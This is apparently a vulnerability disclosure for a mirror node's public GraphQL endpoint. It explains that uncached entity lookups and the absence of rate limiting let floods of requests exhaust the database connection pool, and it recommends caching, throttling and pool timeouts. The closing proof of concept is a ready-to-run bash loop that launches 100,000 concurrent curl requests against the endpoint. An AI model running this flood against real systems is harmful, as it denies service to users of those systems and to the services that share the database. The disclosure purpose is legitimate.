### Title
Unauthenticated GraphQL Endpoint Lacks Rate Limiting and Per-Request Caching, Enabling Database Exhaustion DoS

### Summary
The `getByIdAndType()` method in `EntityServiceImpl` calls `entityRepository.findById()` on every invocation with no caching and no rate limiting at the GraphQL layer. An unprivileged attacker can flood the public `/graphql/alpha` endpoint with requests using unique entity IDs, causing one uncached database query per request and exhausting the DB connection pool, rendering the GraphQL service unavailable.

### Finding Description

**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, line 25:
```java
return entityRepository.findById(entityId.getId()).filter(e -> e.getType() == type);
```

The graphql-module `EntityRepository` (`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`) extends `CrudRepository<Entity, Long>` with **no `@Cacheable` annotation** on `findById`. This is in direct contrast to:
- `grpc/EntityRepository` — annotates `findById` with `@Cacheable`
- `web3/EntityRepository` — annotates `findByIdAndDeletedIsFalse` with `@Caching`/`@Cacheable`

The graphql module's `config/` directory contains only `GraphQlConfiguration.java`, `CustomExceptionResolver.java`, `LoggingFilter.java`, and `MetricsConfiguration.java` — **no `SecurityConfiguration`, no throttle filter, no rate-limit bucket** (unlike the `web3` module which has `ThrottleConfiguration` with a `rateLimitBucket` defaulting to 500 req/s).

`GraphQlConfiguration` applies only structural guards:
- `MaxQueryComplexityInstrumentation(200)` — limits complexity per single query, not request rate
- `MaxQueryDepthInstrumentation(10)` — limits nesting depth, not request rate
- Parser token/character limits — prevent large individual payloads, not flooding

None of these prevent an attacker from sending thousands of syntactically valid, low-complexity queries per second.

**Exploit flow:**

1. Attacker sends a stream of valid GraphQL requests to the public endpoint (no authentication required):
   ```
   POST /graphql/alpha
   {"query": "{account(input: {entityId: {shard: 0, realm: 0, num: N}}) { balance }}"}
   ```
   where `N` increments with each request.
2. Each request passes all structural checks (complexity ≤ 200, depth ≤ 10, tokens ≤ 1000).
3. Each request reaches `getByIdAndType()` → `entityRepository.findById(N)`.
4. Because `findById` is uncached in the graphql module, every unique `N` issues a fresh `SELECT * FROM entity WHERE id = N` against the database.
5. The DB connection pool (HikariCP) is exhausted; subsequent requests queue or fail.

### Impact Explanation

The realistic impact is **denial of service of the GraphQL API and shared database connection pool**. The mirror node is a read-only service and does not participate in Hedera consensus or transaction confirmation, so the "total network shutdown" framing in the question is inaccurate. However, DB connection pool exhaustion can spill over to other mirror node services (REST, gRPC) that share the same database, degrading or halting all mirror node read operations.

### Likelihood Explanation

Preconditions: none — the endpoint is publicly accessible with no authentication. The attack requires only an HTTP client and the ability to generate incrementing entity IDs. It is trivially scriptable, repeatable, and requires no special knowledge or privileges. The absence of any rate-limiting infrastructure in the graphql module (unlike web3) makes this straightforward to sustain.

### Recommendation

1. **Add caching to `EntityRepository.findById`** in the graphql module, mirroring the `@Cacheable` pattern used in the grpc module.
2. **Implement a rate-limiting filter** for the graphql module analogous to `ThrottleConfiguration`/`ThrottleManagerImpl` in the web3 module, enforcing a maximum requests-per-second per IP or globally.
3. **Add a DB connection pool timeout and queue limit** so that pool exhaustion fails fast rather than cascading.

### Proof of Concept

```bash
# Flood with unique entity IDs — each triggers an uncached DB query
for i in $(seq 1 100000); do
  curl -s -o /dev/null -X POST http://<host>:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{account(input: {entityId: {shard: 0, realm: 0, num: $i}}) { balance }}\"}" &
done
```

After a few thousand concurrent requests, HikariCP connection pool metrics (`hikaricp_connections_active / hikaricp_connections_max`) will reach 100%, and subsequent GraphQL requests will return errors or time out. The `GraphQLHighDBConnections` alert defined in the Helm chart fires at 75% utilization, confirming the attack surface is known but unmitigated at the application layer.
